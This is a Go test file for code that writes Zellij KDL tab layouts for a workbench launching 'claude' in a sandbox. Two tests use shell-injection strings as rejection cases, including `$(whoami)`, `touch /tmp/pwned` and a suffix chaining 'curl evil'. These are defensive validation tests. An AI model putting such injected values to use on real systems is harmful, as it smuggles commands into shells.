package zellij

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestWriteTabLayoutPath(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	path, err := WorkbenchWorkspace().WriteTabLayout("myworktree", "/wt/path", "15%", []string{"run", "--profile", "claude-code", "--allow", "/wt/path", "--", "claude"}, nil)
	if err != nil {
		t.Fatalf("WriteTabLayout() error = %v", err)
	}
	if filepath.Base(path) != "myworktree.kdl" {
		t.Errorf("layout path base = %q, want myworktree.kdl", filepath.Base(path))
	}
	if _, err := os.Stat(path); err != nil {
		t.Errorf("layout file not found at %q: %v", path, err)
	}
}

func TestWriteTabLayoutContent(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	nonoArgs := []string{"run", "--profile", "claude-code", "--allow", "/wt/path", "--", "claude"}
	path, err := WorkbenchWorkspace().WriteTabLayout("atlanta", "/wt/path", "15%", nonoArgs, nil)
	if err != nil {
		t.Fatal(err)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	kdl := string(data)

	checks := []struct {
		desc    string
		contain string
	}{
		{"sidebar width", `size="15%"`},
		{"pane name", `pane name="atlanta"`},
		{"cwd", `cwd="/wt/path"`},
		{"command nono", `command "nono"`},
		{"profile arg", `"claude-code"`},
		{"binary arg", `"claude"`},
		{"separator arg", `"--"`},
		{"sidebar restart", `while true; do workbench ls && sleep 2 || sleep 5; done`},
		{"sidebar env", `WORKBENCH_SIDEBAR=1`},
	}
	for _, c := range checks {
		if !strings.Contains(kdl, c.contain) {
			t.Errorf("%s: %q not found in KDL:\n%s", c.desc, c.contain, kdl)
		}
	}
}

func TestWriteTabLayoutWithEnvVars(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	env := map[string]string{
		"WORKBENCH":               "1",
		"WORKBENCH_WORKTREE_NAME": "atlanta",
	}
	path, err := WorkbenchWorkspace().WriteTabLayout("atlanta", "/wt", "15%", []string{"run", "--", "bash"}, env)
	if err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(path)
	kdl := string(data)

	if !strings.Contains(kdl, `command "env"`) {
		t.Errorf("expected command env wrapper in KDL:\n%s", kdl)
	}
	if !strings.Contains(kdl, `"WORKBENCH=1"`) {
		t.Errorf("WORKBENCH=1 env arg not found in KDL:\n%s", kdl)
	}
	if !strings.Contains(kdl, `"WORKBENCH_WORKTREE_NAME=atlanta"`) {
		t.Errorf("WORKBENCH_WORKTREE_NAME=atlanta env arg not found in KDL:\n%s", kdl)
	}
	if !strings.Contains(kdl, `"nono"`) {
		t.Errorf("nono command not found in args in KDL:\n%s", kdl)
	}

	if strings.Contains(kdl, "env {") {
		t.Errorf("should not contain env {} block (not valid KDL pane property):\n%s", kdl)
	}
}

func TestWriteTabLayoutPaneNameComposite(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	env := map[string]string{"WORKBENCH_REPO_ALIAS": "wb"}
	path, err := WorkbenchWorkspace().WriteTabLayout("atlanta", "/wt", "15%", []string{"run", "--", "bash"}, env)
	if err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(path)
	if !strings.Contains(string(data), `pane name="wb/atlanta"`) {
		t.Errorf("expected pane name \"wb/atlanta\":\n%s", string(data))
	}

	// Without an alias, the pane name falls back to the bare worktree name.
	path2, err := WorkbenchWorkspace().WriteTabLayout("atlanta", "/wt", "15%", []string{"run", "--", "bash"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	data2, _ := os.ReadFile(path2)
	if !strings.Contains(string(data2), `pane name="atlanta"`) {
		t.Errorf("expected bare pane name \"atlanta\":\n%s", string(data2))
	}
}

func TestWriteTabLayoutRejectsUnsafeName(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	unsafe := []string{
		`x'; touch /tmp/pwned; '`, // shell injection attempt
		`a"b`,                     // would break the KDL string
		`foo bar`,                 // space
		`$(whoami)`,               // command substitution
		"",                        // empty
	}
	for _, name := range unsafe {
		if _, err := WorkbenchWorkspace().WriteTabLayout(name, "/wt", "15%", []string{"nono"}, nil); err == nil {
			t.Errorf("WriteTabLayout(%q) = nil error, want rejection", name)
		}
	}
}

func TestWriteTabLayoutRejectsUnsafeSuffix(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	// A "<name>:<suffix>" tab identity must validate the suffix too — it reaches
	// the sidebar bash command via SidebarActiveEnvVar.
	unsafe := []string{"atlanta:x=1 && curl evil", "atlanta:a b", `atlanta:a"b`}
	for _, name := range unsafe {
		if _, err := WorkbenchWorkspace().WriteTabLayout(name, "/wt", "15%", []string{"nono"}, nil); err == nil {
			t.Errorf("WriteTabLayout(%q) = nil error, want rejection", name)
		}
	}
	// A well-formed suffix is accepted.
	if _, err := WorkbenchWorkspace().WriteTabLayout("atlanta:reviewer", "/wt", "15%", []string{"nono"}, nil); err != nil {
		t.Errorf("WriteTabLayout(atlanta:reviewer) = %v, want nil", err)
	}
}

func TestWriteTabLayoutQuotesArgs(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	path, err := WorkbenchWorkspace().WriteTabLayout("tab", "/wt", "15%", []string{`has"quote`}, nil)
	if err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(path)
	if !strings.Contains(string(data), `"has\"quote"`) {
		t.Errorf("quote not escaped in KDL:\n%s", string(data))
	}
}

func TestWriteTabLayoutCreatesDir(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	path, err := WorkbenchWorkspace().WriteTabLayout("x", "/wt", "15%", []string{"nono"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Dir(path)); err != nil {
		t.Errorf("layouts dir not created: %v", err)
	}
}

func TestWriteTabLayoutOverwrites(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	_, err := WorkbenchWorkspace().WriteTabLayout("tab", "/old", "15%", []string{"old"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	path, err := WorkbenchWorkspace().WriteTabLayout("tab", "/new", "15%", []string{"new"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(path)
	if strings.Contains(string(data), "/old") {
		t.Error("second write should overwrite the first")
	}
	if !strings.Contains(string(data), "/new") {
		t.Error("second write did not write new cwd")
	}
}
